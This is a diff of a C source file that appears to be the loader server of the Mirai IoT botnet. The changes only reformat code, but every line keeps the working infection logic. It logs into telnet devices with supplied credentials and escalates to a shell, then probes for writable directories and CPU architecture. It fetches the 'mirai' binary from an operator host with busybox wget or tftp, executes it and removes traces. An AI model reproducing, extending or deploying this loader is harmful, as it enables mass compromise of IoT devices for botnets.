@@ -18,8 +18,8 @@
 
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
-    struct server *srv = calloc(1, sizeof (struct server));
-    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
+    struct server *srv = calloc(1, sizeof(struct server));
+    struct server_worker *workers = calloc(threads, sizeof(struct server_worker));
     int i;
 
     // Fill out the structure
@@ -29,8 +29,8 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
     srv->wget_host_ip = wghip;
     srv->wget_host_port = wghp;
     srv->tftp_host_ip = thip;
-    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
-    srv->workers = calloc(threads, sizeof (struct server_worker));
+    srv->estab_conns = calloc(max_open * 2, sizeof(struct connection *));
+    srv->workers = calloc(threads, sizeof(struct server_worker));
     srv->workers_len = threads;
 
     if (srv->estab_conns == NULL)
@@ -42,7 +42,7 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
     // Allocate locks internally
     for (i = 0; i < max_open * 2; i++)
     {
-        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
+        srv->estab_conns[i] = calloc(1, sizeof(struct connection));
         if (srv->estab_conns[i] == NULL)
         {
             printf("Failed to allocate connection %d\n", i);
@@ -133,7 +133,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
         printf("srv == NULL 4\n");
 
     conn = srv->estab_conns[fd];
-    memcpy(&conn->info, info, sizeof (struct telnet_info));
+    memcpy(&conn->info, info, sizeof(struct telnet_info));
     conn->srv = srv;
     conn->fd = fd;
     connection_open(conn);
@@ -141,7 +141,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = info->addr;
     addr.sin_port = info->port;
-    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+    ret = connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
     if (ret == -1 && errno != EINPROGRESS)
     {
         printf("got connect error\n");
@@ -158,7 +158,7 @@ static void bind_core(int core)
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
     CPU_SET(core, &cpuset);
-    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0)
+    if (pthread_setaffinity_np(tid, sizeof(cpu_set_t), &cpuset) != 0)
         printf("Failed to bind to core %d\n", core);
 }
 
@@ -248,7 +248,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         conn->last_recv = time(NULL);
         while (TRUE)
         {
-            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
+            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof(conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
             if (ret <= 0)
             {
                 if (errno != EAGAIN && errno != EWOULDBLOCK)
@@ -268,10 +268,10 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
             conn->last_recv = time(NULL);
 
             if (conn->rdbuf_pos > 8196)
-			{
+            {
                 printf("oversized buffer pointer!\n");
-				abort();
-			}
+                abort();
+            }
 
             while (TRUE)
             {
@@ -279,294 +279,294 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 
                 switch (conn->state_telnet)
                 {
-                    case TELNET_READ_IACS:
-                        consumed = connection_consume_iacs(conn);
-                        if (consumed)
-                            conn->state_telnet = TELNET_USER_PROMPT;
-                        break;
-                    case TELNET_USER_PROMPT:
-                        consumed = connection_consume_login_prompt(conn);
-                        if (consumed)
-                        {
-                            util_sockprintf(conn->fd, "%s", conn->info.user);
-                            strcpy(conn->output_buffer.data, "\r\n");
-                            conn->output_buffer.deadline = time(NULL) + 1;
-                            conn->state_telnet = TELNET_PASS_PROMPT;
-                        }
-                        break;
-                    case TELNET_PASS_PROMPT:
-                        consumed = connection_consume_password_prompt(conn);
-                        if (consumed)
-                        {
-                            util_sockprintf(conn->fd, "%s", conn->info.pass);
-                            strcpy(conn->output_buffer.data, "\r\n");
-                            conn->output_buffer.deadline = time(NULL) + 1;
-                            conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
-                        }
-                        break;
-                    case TELNET_WAITPASS_PROMPT:
-                        if ((consumed = connection_consume_prompt(conn)) > 0)
-                        {
-                            util_sockprintf(conn->fd, "enable\r\n");
-                            util_sockprintf(conn->fd, "shell\r\n");
-                            util_sockprintf(conn->fd, "sh\r\n");
-                            conn->state_telnet = TELNET_CHECK_LOGIN;
-                        }
-                        break;
-                    case TELNET_CHECK_LOGIN:
-                        if ((consumed = connection_consume_prompt(conn)) > 0)
-                        {
-                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
-                            conn->state_telnet = TELNET_VERIFY_LOGIN;
-                        }
-                        break;
-                    case TELNET_VERIFY_LOGIN:
-                        consumed = connection_consume_verify_login(conn);
-                        if (consumed)
-                        {
-                            ATOMIC_INC(&wrker->srv->total_logins);
+                case TELNET_READ_IACS:
+                    consumed = connection_consume_iacs(conn);
+                    if (consumed)
+                        conn->state_telnet = TELNET_USER_PROMPT;
+                    break;
+                case TELNET_USER_PROMPT:
+                    consumed = connection_consume_login_prompt(conn);
+                    if (consumed)
+                    {
+                        util_sockprintf(conn->fd, "%s", conn->info.user);
+                        strcpy(conn->output_buffer.data, "\r\n");
+                        conn->output_buffer.deadline = time(NULL) + 1;
+                        conn->state_telnet = TELNET_PASS_PROMPT;
+                    }
+                    break;
+                case TELNET_PASS_PROMPT:
+                    consumed = connection_consume_password_prompt(conn);
+                    if (consumed)
+                    {
+                        util_sockprintf(conn->fd, "%s", conn->info.pass);
+                        strcpy(conn->output_buffer.data, "\r\n");
+                        conn->output_buffer.deadline = time(NULL) + 1;
+                        conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
+                    }
+                    break;
+                case TELNET_WAITPASS_PROMPT:
+                    if ((consumed = connection_consume_prompt(conn)) > 0)
+                    {
+                        util_sockprintf(conn->fd, "enable\r\n");
+                        util_sockprintf(conn->fd, "shell\r\n");
+                        util_sockprintf(conn->fd, "sh\r\n");
+                        conn->state_telnet = TELNET_CHECK_LOGIN;
+                    }
+                    break;
+                case TELNET_CHECK_LOGIN:
+                    if ((consumed = connection_consume_prompt(conn)) > 0)
+                    {
+                        util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+                        conn->state_telnet = TELNET_VERIFY_LOGIN;
+                    }
+                    break;
+                case TELNET_VERIFY_LOGIN:
+                    consumed = connection_consume_verify_login(conn);
+                    if (consumed)
+                    {
+                        ATOMIC_INC(&wrker->srv->total_logins);
 #ifdef DEBUG
-                            printf("[FD%d] Succesfully logged in\n", ev->data.fd);
+                        printf("[FD%d] Succesfully logged in\n", ev->data.fd);
 #endif
-                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
-                            conn->state_telnet = TELNET_PARSE_PS;
-                        }
-                        break;
-                    case TELNET_PARSE_PS:
-                        if ((consumed = connection_consume_psoutput(conn)) > 0)
-                        {
-                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
-                            conn->state_telnet = TELNET_PARSE_MOUNTS;
-                        }
-                        break;
-                    case TELNET_PARSE_MOUNTS:
-                        consumed = connection_consume_mounts(conn);
-                        if (consumed)
-                            conn->state_telnet = TELNET_READ_WRITEABLE;
-                        break;
-                    case TELNET_READ_WRITEABLE:
-                        consumed = connection_consume_written_dirs(conn);
-                        if (consumed)
-                        {
+                        util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
+                        conn->state_telnet = TELNET_PARSE_PS;
+                    }
+                    break;
+                case TELNET_PARSE_PS:
+                    if ((consumed = connection_consume_psoutput(conn)) > 0)
+                    {
+                        util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
+                        conn->state_telnet = TELNET_PARSE_MOUNTS;
+                    }
+                    break;
+                case TELNET_PARSE_MOUNTS:
+                    consumed = connection_consume_mounts(conn);
+                    if (consumed)
+                        conn->state_telnet = TELNET_READ_WRITEABLE;
+                    break;
+                case TELNET_READ_WRITEABLE:
+                    consumed = connection_consume_written_dirs(conn);
+                    if (consumed)
+                    {
 #ifdef DEBUG
-                            printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
+                        printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
 #endif
-                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
-                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
-                            conn->state_telnet = TELNET_COPY_ECHO;
+                        util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
+                        util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
+                        conn->state_telnet = TELNET_COPY_ECHO;
+                        conn->timeout = 120;
+                    }
+                    break;
+                case TELNET_COPY_ECHO:
+                    consumed = connection_consume_copy_op(conn);
+                    if (consumed)
+                    {
+#ifdef DEBUG
+                        printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
+#endif
+                        if (!conn->info.has_arch)
+                        {
+                            conn->state_telnet = TELNET_DETECT_ARCH;
                             conn->timeout = 120;
+                            // DO NOT COMBINE THESE
+                            util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
+                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                         }
-                        break;
-                    case TELNET_COPY_ECHO:
-                        consumed = connection_consume_copy_op(conn);
-                        if (consumed)
+                        else
                         {
-#ifdef DEBUG
-                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
-#endif
-                            if (!conn->info.has_arch)
-                            {
-                                conn->state_telnet = TELNET_DETECT_ARCH;
-                                conn->timeout = 120;
-                                // DO NOT COMBINE THESE
-                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
-                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
-                            }
-                            else
-                            {
-                                conn->state_telnet = TELNET_UPLOAD_METHODS;
-                                conn->timeout = 15;
-                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
-                            }
-                        }
-                        break;
-                    case TELNET_DETECT_ARCH:
-                        consumed = connection_consume_arch(conn);
-                        if (consumed)
-                        {
+                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                             conn->timeout = 15;
-                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
-                            {
-#ifdef DEBUG
-                                printf("[FD%d] Cannot determine architecture\n", conn->fd);
-#endif
-                                connection_close(conn);
-                            }
-                            else if (strcmp(conn->info.arch, "arm") == 0)
-                            {
-#ifdef DEBUG
-                                printf("[FD%d] Determining ARM sub-type\n", conn->fd);
-#endif
-                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
-                                conn->state_telnet = TELNET_ARM_SUBTYPE;
-                            }
-                            else
-                            {
-#ifdef DEBUG
-                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
-#endif
-                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
-                                conn->state_telnet = TELNET_UPLOAD_METHODS;
-                            }
+                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                         }
-                        break;
-                    case TELNET_ARM_SUBTYPE:
-                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
+                    }
+                    break;
+                case TELNET_DETECT_ARCH:
+                    consumed = connection_consume_arch(conn);
+                    if (consumed)
+                    {
+                        conn->timeout = 15;
+                        if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                         {
-                            struct binary *bin = binary_get_by_arch(conn->info.arch);
-
-                            if (bin == NULL)
-                            {
 #ifdef DEBUG
-                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
+                            printf("[FD%d] Cannot determine architecture\n", conn->fd);
 #endif
-                            }
-                            else
-                                conn->bin = bin;
-
+                            connection_close(conn);
+                        }
+                        else if (strcmp(conn->info.arch, "arm") == 0)
+                        {
+#ifdef DEBUG
+                            printf("[FD%d] Determining ARM sub-type\n", conn->fd);
+#endif
+                            util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
+                            conn->state_telnet = TELNET_ARM_SUBTYPE;
+                        }
+                        else
+                        {
+#ifdef DEBUG
+                            printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
+#endif
                             util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_UPLOAD_METHODS;
                         }
-                        break;
-                    case TELNET_UPLOAD_METHODS:
-                        consumed = connection_consume_upload_methods(conn);
+                    }
+                    break;
+                case TELNET_ARM_SUBTYPE:
+                    if ((consumed = connection_consume_arm_subtype(conn)) > 0)
+                    {
+                        struct binary *bin = binary_get_by_arch(conn->info.arch);
 
-                        if (consumed)
+                        if (bin == NULL)
                         {
 #ifdef DEBUG
-                            printf("[FD%d] Upload method is ", conn->fd);
+                            printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
 #endif
-                            switch (conn->info.upload_method)
-                            {
-                                case UPLOAD_ECHO:
-                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
-                                    conn->timeout = 30;
-                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
-#ifdef DEBUG
-                                    printf("echo\n");
-#endif
-                                    break;
-                                case UPLOAD_WGET:
-                                    conn->state_telnet = TELNET_UPLOAD_WGET;
-                                    conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
-#ifdef DEBUG
-                                    printf("wget\n");
-#endif
-                                    break;
-                                case UPLOAD_TFTP:
-                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
-                                    conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
-#ifdef DEBUG
-                                    printf("tftp\n");
-#endif
-                                    break;
-                            }
                         }
-                        break;
-                    case TELNET_UPLOAD_ECHO:   
-                        consumed = connection_upload_echo(conn);
-                        if (consumed)
-                        {
-                            conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
+                        else
+                            conn->bin = bin;
+
+                        util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                        conn->state_telnet = TELNET_UPLOAD_METHODS;
+                    }
+                    break;
+                case TELNET_UPLOAD_METHODS:
+                    consumed = connection_consume_upload_methods(conn);
+
+                    if (consumed)
+                    {
 #ifdef DEBUG
-                            printf("[FD%d] Finished echo loading!\n", conn->fd);
+                        printf("[FD%d] Upload method is ", conn->fd);
 #endif
-                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
-                            ATOMIC_INC(&wrker->srv->total_echoes);
-                        }
-                        break;
-                    case TELNET_UPLOAD_WGET:
-                        consumed = connection_upload_wget(conn);
-                        if (consumed)
+                        switch (conn->info.upload_method)
                         {
-                            conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
-#ifdef DEBUG
-                            printf("[FD%d] Finished wget loading\n", conn->fd);
-#endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
-                            ATOMIC_INC(&wrker->srv->total_wgets);
-                        }
-                        break;
-                    case TELNET_UPLOAD_TFTP:
-                        consumed = connection_upload_tftp(conn);
-                        if (consumed > 0)
-                        {
-                            conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
-#ifdef DEBUG
-                            printf("[FD%d] Finished tftp loading\n", conn->fd);
-#endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
-                            ATOMIC_INC(&wrker->srv->total_tftps);
-                        }
-                        else if (consumed < -1) // Did not have permission to TFTP
-                        {
-#ifdef DEBUG
-                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
-#endif
-                            consumed *= -1;
+                        case UPLOAD_ECHO:
                             conn->state_telnet = TELNET_UPLOAD_ECHO;
-                            conn->info.upload_method = UPLOAD_ECHO;
-
                             conn->timeout = 30;
-                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
-                        }
-                        break;
-                    case TELNET_RUN_BINARY:
-                        if ((consumed = connection_verify_payload(conn)) > 0)
-                        {
-                            if (consumed >= 255)
-                            {
-                                conn->success = TRUE;
+                            util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
 #ifdef DEBUG
-                                printf("[FD%d] Succesfully ran payload\n", conn->fd);
+                            printf("echo\n");
 #endif
-                                consumed -= 255;
-                            }
-                            else
-                            {
+                            break;
+                        case UPLOAD_WGET:
+                            conn->state_telnet = TELNET_UPLOAD_WGET;
+                            conn->timeout = 120;
+                            util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > " FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                            wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
 #ifdef DEBUG
-                                printf("[FD%d] Failed to execute payload\n", conn->fd);
+                            printf("wget\n");
 #endif
-                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
-                                {
-                                    conn->echo_load_pos = 0;
-                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
-                                    conn->bin = binary_get_by_arch(conn->info.arch);
-                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
-                                    conn->state_telnet = TELNET_UPLOAD_METHODS;
-                                    conn->retry_bin = TRUE;
-                                    break;
-                                }
-                            }
-#ifndef DEBUG
-                            util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
-#else
-                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+                            break;
+                        case UPLOAD_TFTP:
+                            conn->state_telnet = TELNET_UPLOAD_TFTP;
+                            conn->timeout = 120;
+                            util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                            FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
+#ifdef DEBUG
+                            printf("tftp\n");
 #endif
-                            conn->state_telnet = TELNET_CLEANUP;
-                            conn->timeout = 10;
+                            break;
                         }
-                        break;
-                    case TELNET_CLEANUP:
-                        if ((consumed = connection_consume_cleanup(conn)) > 0)
-                        {
-                            int tfd = conn->fd;
+                    }
+                    break;
+                case TELNET_UPLOAD_ECHO:
+                    consumed = connection_upload_echo(conn);
+                    if (consumed)
+                    {
+                        conn->state_telnet = TELNET_RUN_BINARY;
+                        conn->timeout = 30;
+#ifdef DEBUG
+                        printf("[FD%d] Finished echo loading!\n", conn->fd);
+#endif
+                        util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
+                        ATOMIC_INC(&wrker->srv->total_echoes);
+                    }
+                    break;
+                case TELNET_UPLOAD_WGET:
+                    consumed = connection_upload_wget(conn);
+                    if (consumed)
+                    {
+                        conn->state_telnet = TELNET_RUN_BINARY;
+                        conn->timeout = 30;
+#ifdef DEBUG
+                        printf("[FD%d] Finished wget loading\n", conn->fd);
+#endif
+                        util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                        ATOMIC_INC(&wrker->srv->total_wgets);
+                    }
+                    break;
+                case TELNET_UPLOAD_TFTP:
+                    consumed = connection_upload_tftp(conn);
+                    if (consumed > 0)
+                    {
+                        conn->state_telnet = TELNET_RUN_BINARY;
+                        conn->timeout = 30;
+#ifdef DEBUG
+                        printf("[FD%d] Finished tftp loading\n", conn->fd);
+#endif
+                        util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                        ATOMIC_INC(&wrker->srv->total_tftps);
+                    }
+                    else if (consumed < -1) // Did not have permission to TFTP
+                    {
+#ifdef DEBUG
+                        printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
+#endif
+                        consumed *= -1;
+                        conn->state_telnet = TELNET_UPLOAD_ECHO;
+                        conn->info.upload_method = UPLOAD_ECHO;
 
-                            connection_close(conn);
+                        conn->timeout = 30;
+                        util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
+                    }
+                    break;
+                case TELNET_RUN_BINARY:
+                    if ((consumed = connection_verify_payload(conn)) > 0)
+                    {
+                        if (consumed >= 255)
+                        {
+                            conn->success = TRUE;
 #ifdef DEBUG
-                            printf("[FD%d] Cleaned up files\n", tfd);
+                            printf("[FD%d] Succesfully ran payload\n", conn->fd);
 #endif
+                            consumed -= 255;
                         }
-                    default:
-                        consumed = 0;
-                        break;
+                        else
+                        {
+#ifdef DEBUG
+                            printf("[FD%d] Failed to execute payload\n", conn->fd);
+#endif
+                            if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
+                            {
+                                conn->echo_load_pos = 0;
+                                strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
+                                conn->bin = binary_get_by_arch(conn->info.arch);
+                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                conn->state_telnet = TELNET_UPLOAD_METHODS;
+                                conn->retry_bin = TRUE;
+                                break;
+                            }
+                        }
+#ifndef DEBUG
+                        util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
+#else
+                        util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+#endif
+                        conn->state_telnet = TELNET_CLEANUP;
+                        conn->timeout = 10;
+                    }
+                    break;
+                case TELNET_CLEANUP:
+                    if ((consumed = connection_consume_cleanup(conn)) > 0)
+                    {
+                        int tfd = conn->fd;
+
+                        connection_close(conn);
+#ifdef DEBUG
+                        printf("[FD%d] Cleaned up files\n", tfd);
+#endif
+                    }
+                default:
+                    consumed = 0;
+                    break;
                 }
 
                 if (consumed == 0) // We didn't consume any data
@@ -624,10 +624,13 @@ static void *timeout_thread(void *arg)
                     util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                     conn->state_telnet = TELNET_UPLOAD_METHODS;
                     conn->retry_bin = TRUE;
-                } else {
+                }
+                else
+                {
                     connection_close(conn);
                 }
-            } else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
+            }
+            else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
             {
                 conn->output_buffer.deadline = 0;
                 util_sockprintf(conn->fd, conn->output_buffer.data);
@@ -637,4 +640,3 @@ static void *timeout_thread(void *arg)
         sleep(1);
     }
 }
-
